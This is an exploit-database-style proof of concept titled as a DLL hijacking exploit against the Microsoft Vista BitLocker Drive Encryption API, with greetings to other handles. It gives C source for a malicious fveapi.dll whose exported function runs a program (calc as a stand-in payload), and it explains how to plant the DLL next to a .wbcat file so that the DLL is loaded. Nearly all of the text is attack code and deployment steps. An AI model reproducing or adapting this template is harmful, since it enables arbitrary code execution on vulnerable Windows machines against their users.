# Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles , Dinesh Arora

/* 
Exploit Title: Microsoft Vista BitLocker Drive Encryption API Hijacking Exploit
Date: 25/08/2010
Author: Beenu Arora
Tested on: Windows XP SP3
Vulnerable extensions: .wbcat

Compile and rename to fveapi.dll, create a file in the same dir with one of the following extensions:
.wbcat


#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}
